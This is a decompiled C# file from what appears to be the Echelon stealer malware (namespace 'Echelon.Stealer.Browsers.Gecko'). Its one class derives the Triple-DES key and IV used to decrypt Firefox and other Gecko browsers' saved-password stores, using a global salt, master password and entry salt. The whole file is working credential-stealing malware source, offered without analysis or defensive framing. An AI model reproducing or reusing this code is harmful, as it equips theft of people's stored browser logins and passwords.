using System;
using System.Security.Cryptography;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x0200003A RID: 58
	public class Gecko8
	{
		// Token: 0x06000161 RID: 353 RVA: 0x0000B1D8 File Offset: 0x000093D8
		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			this._globalSalt = salt;
			this._masterPassword = password;
			this._entrySalt = entry;
		}

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x06000162 RID: 354 RVA: 0x0000B1F8 File Offset: 0x000093F8
		private byte[] _globalSalt { get; }

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x06000163 RID: 355 RVA: 0x0000B200 File Offset: 0x00009400
		private byte[] _masterPassword { get; }

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x06000164 RID: 356 RVA: 0x0000B208 File Offset: 0x00009408
		private byte[] _entrySalt { get; }

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x06000165 RID: 357 RVA: 0x0000B210 File Offset: 0x00009410
		// (set) Token: 0x06000166 RID: 358 RVA: 0x0000B218 File Offset: 0x00009418
		public byte[] DataKey { get; private set; }

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x06000167 RID: 359 RVA: 0x0000B224 File Offset: 0x00009424
		// (set) Token: 0x06000168 RID: 360 RVA: 0x0000B22C File Offset: 0x0000942C
		public byte[] DataIV { get; private set; }

		// Token: 0x06000169 RID: 361 RVA: 0x0000B238 File Offset: 0x00009438
		public void го7па()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			Array.Copy(this._globalSalt, 0, array, 0, this._globalSalt.Length);
			Array.Copy(this._masterPassword, 0, array, this._globalSalt.Length, this._masterPassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this._entrySalt, 0, array3, array2.Length, this._entrySalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this._entrySalt, 0, array4, 0, this._entrySalt.Length);
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this._entrySalt, 0, array5, array4.Length, this._entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this._entrySalt, 0, array8, array7.Length, this._entrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
